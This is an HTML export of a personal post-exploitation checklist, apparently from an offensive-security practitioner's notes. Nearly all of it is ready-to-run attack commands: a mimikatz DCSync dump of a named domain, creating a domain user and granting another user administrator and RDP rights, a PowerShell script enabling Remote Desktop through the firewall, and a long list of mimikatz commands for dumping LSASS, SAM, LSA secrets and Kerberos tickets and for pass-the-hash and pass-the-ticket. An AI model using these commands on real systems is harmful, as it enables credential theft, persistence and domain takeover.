<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>04- Post exploit checklist</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>04- Post exploit checklist</h1><br/><p></p><p><h2>General Post exploit</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#dcsync</span><br />  .<span style="color:#333333;font-weight:400">\m</span>imikatz.exe <span style="color:#3ad900;font-weight:400">&quot;privilege::debug&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;lsadump::dcsync /domain:complyedge.com /all /csv&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;exit&quot;</span><br /><span style="color:#0088ff;font-weight:400"># add domain admin</span><br />net user youness Password123! /add /domain<br />net localgroup <span style="color:#3ad900;font-weight:400">&quot;Administrators&quot;</span> Mohammad.Francis /add <br />net localgroup <span style="color:#3ad900;font-weight:400">&quot;Remote Desktop Users&quot;</span> Mohammad.Francis /add <br /><br /><span style="color:#0088ff;font-weight:400">## enable rdp</span><br /><br /><span style="color:#7f0044;font-weight:400">$RDP</span> = Get-ItemProperty -Path <span style="color:#3ad900;font-weight:400">&quot;HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> -Name <span style="color:#3ad900;font-weight:400">&quot;fDenyTSConnections&quot;</span><br /><span style="color:#ff9d00;font-weight:700">if</span> <span style="color:#333333;font-weight:400">($RDP.fDenyTSConnections -eq 1)</span> <span style="color:#ff9d00;font-weight:700">{</span><br />    Write-Output <span style="color:#3ad900;font-weight:400">&quot;Enabling Remote Desktop...&quot;</span><br />    Set-ItemProperty -Path <span style="color:#3ad900;font-weight:400">&quot;HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> -Name <span style="color:#3ad900;font-weight:400">&quot;fDenyTSConnections&quot;</span> -Value 0<br />    netsh advfirewall firewall set rule group=<span style="color:#3ad900;font-weight:400">&#39;remote desktop&#39;</span> new enable=Yes<br />    Write-Output <span style="color:#3ad900;font-weight:400">&quot;Remote Desktop is now enabled.&quot;</span><br /><span style="color:#ff9d00;font-weight:700">}</span> <span style="color:#ff9d00;font-weight:700">else</span> <span style="color:#ff9d00;font-weight:700">{</span><br />    Write-Output <span style="color:#3ad900;font-weight:400">&quot;Remote Desktop is already enabled.&quot;</span><br /><span style="color:#ff9d00;font-weight:700">}</span></pre></div></p><p></p><p></p><p></p><p><h2>Mimikatz</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#The commands are in cobalt strike format!</span><br /><br /><span style="color:#0088ff;font-weight:400">#Dump LSASS:</span><br />mimikatz privilege<span style="color:#ff9d00;font-weight:700">::</span>debug<br />mimikatz token<span style="color:#ff9d00;font-weight:700">::</span>elevate<br />mimikatz sekurlsa<span style="color:#ff9d00;font-weight:700">::</span>logonpasswords<br /><br /><span style="color:#0088ff;font-weight:400">#(Over) Pass The Hash</span><br />mimikatz privilege<span style="color:#ff9d00;font-weight:700">::</span>debug<br />mimikatz sekurlsa<span style="color:#ff9d00;font-weight:700">::</span>pth <span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:</span>&lt;UserName&gt; <span style="color:#ff9d00;font-weight:700">/</span>ntlm<span style="color:#ff9d00;font-weight:700">:</span>&lt;&gt; <span style="color:#ff9d00;font-weight:700">/</span>domain<span style="color:#ff9d00;font-weight:700">:</span>&lt;DomainFQDN&gt;<br /><br /><span style="color:#0088ff;font-weight:400">#List all available kerberos tickets in memory</span><br />mimikatz sekurlsa<span style="color:#ff9d00;font-weight:700">::</span>tickets<br /><br /><span style="color:#0088ff;font-weight:400">#Dump local Terminal Services credentials</span><br />mimikatz sekurlsa<span style="color:#ff9d00;font-weight:700">::</span>tspkg<br /><br /><span style="color:#0088ff;font-weight:400">#Dump and save LSASS in a file</span><br />mimikatz sekurlsa<span style="color:#ff9d00;font-weight:700">::</span>minidump c<span style="color:#ff9d00;font-weight:700">:\</span>temp<span style="color:#ff9d00;font-weight:700">\</span>lsass.dmp<br /><br /><span style="color:#0088ff;font-weight:400">#List cached MasterKeys</span><br />mimikatz sekurlsa<span style="color:#ff9d00;font-weight:700">::</span>dpapi<br /><br /><span style="color:#0088ff;font-weight:400">#List local Kerberos AES Keys</span><br />mimikatz sekurlsa<span style="color:#ff9d00;font-weight:700">::</span>ekeys<br /><br /><span style="color:#0088ff;font-weight:400">#Dump SAM Database</span><br />mimikatz lsadump<span style="color:#ff9d00;font-weight:700">::</span>sam<br /><br /><span style="color:#0088ff;font-weight:400">#Dump SECRETS Database</span><br />mimikatz lsadump<span style="color:#ff9d00;font-weight:700">::</span>secrets<br /><br /><span style="color:#0088ff;font-weight:400">#Inject and dump the Domain Controler&#39;s Credentials</span><br />mimikatz privilege<span style="color:#ff9d00;font-weight:700">::</span>debug<br />mimikatz token<span style="color:#ff9d00;font-weight:700">::</span>elevate<br />mimikatz lsadump<span style="color:#ff9d00;font-weight:700">::</span>lsa <span style="color:#ff9d00;font-weight:700">/</span>inject<br /><br /><span style="color:#0088ff;font-weight:400">#Dump the Domain&#39;s Credentials without touching DC&#39;s LSASS and also remotely</span><br />mimikatz lsadump<span style="color:#ff9d00;font-weight:700">::</span>dcsync <span style="color:#ff9d00;font-weight:700">/</span>domain<span style="color:#ff9d00;font-weight:700">:</span>&lt;DomainFQDN&gt; <span style="color:#ff9d00;font-weight:700">/</span>all<br /><br /><span style="color:#0088ff;font-weight:400">#Dump old passwords and NTLM hashes of a user</span><br />mimikatz lsadump<span style="color:#ff9d00;font-weight:700">::</span>dcsync <span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:</span>&lt;DomainFQDN&gt;<span style="color:#ff9d00;font-weight:700">\</span>&lt;user&gt; <span style="color:#ff9d00;font-weight:700">/history</span><br /><br /><span style="color:#0088ff;font-weight:400">#List and Dump local kerberos credentials</span><br />mimikatz kerberos<span style="color:#ff9d00;font-weight:700">::</span>list <span style="color:#ff9d00;font-weight:700">/</span>dump<br /><br /><span style="color:#0088ff;font-weight:400">#Pass The Ticket</span><br />mimikatz kerberos<span style="color:#ff9d00;font-weight:700">::</span>ptt &lt;PathToKirbiFile&gt;<br /><br /><span style="color:#0088ff;font-weight:400">#List TS/RDP sessions</span><br />mimikatz ts<span style="color:#ff9d00;font-weight:700">::</span>sessions<br /><br /><span style="color:#0088ff;font-weight:400">#List Vault credentials</span><br />mimikatz vault<span style="color:#ff9d00;font-weight:700">::</span>list</pre></div></p><p></p><p></p><p></p><p><strong><h2>Search creds</h2></strong><ul><li></p><p>‚òê inside users </li><li>C:\ProgramFiles\Setup</p><p></li></ul></p></div>
</body>
</html>
